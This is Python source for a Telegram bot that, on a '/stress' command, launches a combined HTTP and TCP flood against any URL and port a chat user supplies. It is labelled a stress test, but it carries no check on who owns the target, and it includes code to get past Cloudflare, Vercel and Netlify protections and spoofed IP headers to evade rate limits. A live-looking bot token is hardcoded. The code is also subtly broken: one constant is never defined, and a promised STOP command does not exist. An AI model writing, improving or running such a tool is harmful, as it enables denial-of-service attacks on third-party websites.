#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import socket
import ssl
import cloudscraper
import threading
import time
import logging
import urllib.parse
import sys
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from fake_useragent import UserAgent

# System configuration
try:
    import resource
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (hard, hard))
except (ImportError, ValueError):
    print("Warning: Could not increase file descriptor limit")

# Configuration
BOT_TOKEN = "7729228849:AAHv1rMlNFeoGaI2GJO2_N0-PoOkenZhUg4"
MAX_TEST_DURATION = 4200  # 3 hours maximum
MAX_WORKERS = 1000  # Extreme worker count with optimizations
REQUEST_TIMEOUT = 30  # Seconds
ROTATION_INTERVAL = 300  # Rotate techniques every 5 minutes

# Enhanced User Agents with mobile and legacy variants
ua = UserAgent()
USER_AGENTS = [
    ua.chrome, ua.firefox, ua.safari, ua.edge,
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)"
]

# Advanced bypass configurations
BYPASS_PROFILES = [
    {'browser': 'chrome', 'mobile': False, 'platform': 'windows'},
    {'browser': 'firefox', 'mobile': True, 'platform': 'android'},
    {'browser': 'safari', 'mobile': True, 'platform': 'ios'},
    {'browser': 'chrome', 'mobile': False, 'platform': 'linux'}
]

# Anti-ratelimit techniques
RATELIMIT_BYPASS = {
    "header_rotation": [
        {"X-Forwarded-For": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
        {"X-Real-IP": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
        {"CF-Connecting-IP": lambda: f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
    ],
    "request_pacing": [
        lambda: time.sleep(random.uniform(0.01, 0.1)),
        lambda: time.sleep(random.uniform(0.05, 0.3)),
        lambda: None  # No delay
    ],
    "request_methods": ["GET", "POST", "HEAD", "OPTIONS"]
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('testing.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class AttackResult:
    def __init__(self):
        self.total_requests = 0
        self.successful = 0
        self.blocked = 0
        self.errors = 0
        self.challenges = 0
        self.ratelimit_hits = 0
        self.bypassed = 0
        self.tcp_sent = 0
        self.start_time = time.time()
        self.last_rotation = time.time()
        self.current_profile = 0
        self.current_ratelimit_strategy = 0

    def rotate_techniques(self):
        if time.time() - self.last_rotation > ROTATION_INTERVAL:
            self.current_profile = (self.current_profile + 1) % len(BYPASS_PROFILES)
            self.current_ratelimit_strategy = (self.current_ratelimit_strategy + 1) % len(RATELIMIT_BYPASS["request_pacing"])
            self.last_rotation = time.time()
            logger.info(f"Rotated to profile {self.current_profile} and strategy {self.current_ratelimit_strategy}")

    def duration(self):
        return time.time() - self.start_time

    def requests_per_second(self):
        return self.total_requests / self.duration() if self.duration() > 0 else 0

async def advanced_bypass(url, result):
    """Advanced protection bypass with rotation"""
    try:
        result.rotate_techniques()
        profile = BYPASS_PROFILES[result.current_profile]
        scraper = cloudscraper.create_scraper(browser=profile)
        
        # Apply current ratelimit bypass headers
        headers = {}
        for header in RATELIMIT_BYPASS["header_rotation"]:
            for k, v in header.items():
                headers[k] = v() if callable(v) else v
        
        # First request
        resp = scraper.get(url, timeout=CF_CHALLENGE_TIMEOUT, headers=headers)
        
        # If challenged, rotate and retry
        if resp.status_code in [403, 503, 429, 418]:
            result.challenges += 1
            result.current_profile = (result.current_profile + 1) % len(BYPASS_PROFILES)
            profile = BYPASS_PROFILES[result.current_profile]
            scraper = cloudscraper.create_scraper(browser=profile)
            resp = scraper.get(url, timeout=CF_CHALLENGE_TIMEOUT, headers=headers)
        
        return resp.status_code == 200
    
    except Exception as e:
        logger.error(f"Bypass failed: {str(e)}")
        return False

async def send_evasive_request(session, url, result):
    """Send request with advanced evasion techniques"""
    try:
        # Apply current anti-ratelimit strategy
        RATELIMIT_BYPASS["request_pacing"][result.current_ratelimit_strategy]()
        
        # Build headers
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": random.choice(["keep-alive", "close"]),
            **{k: v() if callable(v) else v for header in RATELIMIT_BYPASS["header_rotation"] for k, v in header.items()}
        }

        # Choose random method
        method = random.choice(RATELIMIT_BYPASS["request_methods"])
        
        # For POST requests, add random data
        data = None
        if method == "POST":
            data = {"random_data": str(random.randint(1, 100000))}
            
        async with session.request(method, url, headers=headers, data=data) as resp:
            return await handle_response(resp, result)
                
    except Exception as e:
        result.errors += 1
        logger.debug(f"Request failed: {str(e)}")
        return False

async def handle_response(response, result):
    """Process server response"""
    result.total_requests += 1
    
    if response.status == 200:
        result.successful += 1
        return True
    elif response.status in [403, 503, 429, 418]:
        result.blocked += 1
        if response.status == 429:
            result.ratelimit_hits += 1
            # Rotate strategy when hitting ratelimits
            result.current_ratelimit_strategy = (result.current_ratelimit_strategy + 1) % len(RATELIMIT_BYPASS["request_pacing"])
        
        if any(x in response.headers.get("server", "").lower() for x in ["cloudflare", "vercel", "netlify"]):
            if await advanced_bypass(str(response.url), result):
                result.bypassed += 1
                return True
    else:
        result.errors += 1
    
    return False

def optimized_tcp_flood(target_ip, target_port, duration, result):
    """Ultra-optimized TCP flood with connection reuse"""
    end_time = time.time() + duration
    ssl_context = ssl.create_default_context()
    sockets = []
    
    # Pre-create socket pool
    for _ in range(100):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            if target_port == 443:
                sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
            sock.connect((target_ip, target_port))
            sockets.append(sock)
        except:
            pass
    
    while time.time() < end_time and not result.errors > 1000:
        try:
            if not sockets:
                # Replenish pool
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if target_port == 443:
                    sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
                sock.connect((target_ip, target_port))
                sockets.append(sock)
                
            sock = random.choice(sockets)
            sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            result.tcp_sent += 1
            time.sleep(0.001)
        except Exception as e:
            logger.debug(f"TCP error: {str(e)}")
            try:
                sock.close()
                sockets.remove(sock)
            except:
                pass
    
    # Cleanup
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

async def attack_worker(session, base_url, port, duration, result):
    """Optimized attack worker with adaptive techniques"""
    end_time = time.time() + duration
    paths = ["/", "/api", "/wp-admin", "/contact", "/blog", "/static/file.js"]
    
    while time.time() < end_time and not result.errors > 1000:
        path = random.choice(paths)
        target_url = f"{base_url}:{port}{path}" if port not in [80, 443] else f"{base_url}{path}"
        await send_evasive_request(session, target_url, result)

async def run_optimized_attack(url, port, duration, workers):
    """Main attack coordinator with resource management"""
    result = AttackResult()
    try:
        parsed_url = urllib.parse.urlparse(url)
        target_ip = socket.gethostbyname(parsed_url.netloc)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Start TCP flood in separate thread
        tcp_thread = threading.Thread(
            target=optimized_tcp_flood,
            args=(target_ip, port, duration, result),
            daemon=True
        )
        tcp_thread.start()
        
        # Configure HTTP client with advanced settings
        connector = aiohttp.TCPConnector(
            limit=0,
            force_close=False,
            enable_cleanup_closed=True,
            ssl=False,
            keepalive_timeout=75
        )
        
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            trust_env=True
        ) as session:
            tasks = []
            for _ in range(min(workers, MAX_WORKERS)):
                task = asyncio.create_task(
                    attack_worker(session, base_url, port, duration, result)
                )
                tasks.append(task)
            
            await asyncio.gather(*tasks)
        
        tcp_thread.join()
    except Exception as e:
        logger.error(f"Attack coordinator error: {str(e)}")
        result.errors += 1000
    
    return result

@dp.message(Command("stress"))
async def start_stress_test(message: types.Message):
    """Handle the stress test command"""
    try:
        args = message.text.split()
        if len(args) < 4:
            await message.reply("Usage: /stress <url> <port> <duration> [workers=250]")
            return

        url = args[1]
        port = int(args[2])
        duration = int(args[3])
        workers = min(int(args[4]), MAX_WORKERS) if len(args) > 4 else 250

        if not url.startswith(("http://", "https://")):
            url = f"http://{url}"

        if duration > MAX_TEST_DURATION:
            await message.reply(f"⚠️ Maximum duration is {MAX_TEST_DURATION} seconds")
            return

        warning_msg = (
            "🚀 Starting ULTRA stress test\n\n"
            f"🔗 Target: {url}\n"
            f"🚪 Port: {port}\n"
            f"⏱ Duration: {duration} seconds\n"
            f"👷 Workers: {workers}\n\n"
            "Testing against:\n"
            "- Cloudflare/Vercel/Netlify protections\n"
            "- Rate limiting systems\n"
            "- TCP/HTTP flood defenses\n\n"
            "Type STOP to abort test."
        )
        
        await message.reply(warning_msg)
        
        start_time = time.time()
        result = await run_optimized_attack(url, port, duration, workers)
        test_duration = time.time() - start_time

        report = f"""
🔥 ULTRA STRESS TEST RESULTS 🔥

🔗 Target: {url}:{port}
⏱ Duration: {test_duration:.2f}s
👷 Workers: {workers}

📊 Traffic Stats:
  • Total Requests: {result.total_requests:,}
  • Successful: {result.successful:,} ({result.successful/max(1, result.total_requests):.1%})
  • Blocked: {result.blocked:,}
  • Errors: {result.errors:,}
  • RPS: {result.requests_per_second():.1f}

🛡 Protection Stats:
  • Challenges: {result.challenges:,}
  • Rate Limits: {result.ratelimit_hits:,}
  • Bypassed: {result.bypassed:,}
  • TCP Packets: {result.tcp_sent:,}

💡 Security Assessment:
  • Protection Strength: {'🟢 Weak' if result.successful > result.blocked*2 else '🟡 Moderate' if result.successful > result.blocked else '🔴 Strong'}
  • Bypass Success Rate: {result.bypassed/max(1, result.blocked):.1%}
  • Anti-Ratelimit Effectiveness: {'🟢 Good' if result.ratelimit_hits < result.total_requests*0.1 else '🟡 Moderate' if result.ratelimit_hits < result.total_requests*0.3 else '🔴 Poor'}
"""
        await message.reply(report)

    except Exception as e:
        await message.reply(f"❌ Critical error: {str(e)}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    # Check system requirements
    if sys.version_info < (3, 7):
        print("Error: Python 3.7 or higher required")
        sys.exit(1)
        
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nTest stopped by user")
    except Exception as e:
        print(f"Fatal error: {str(e)}")
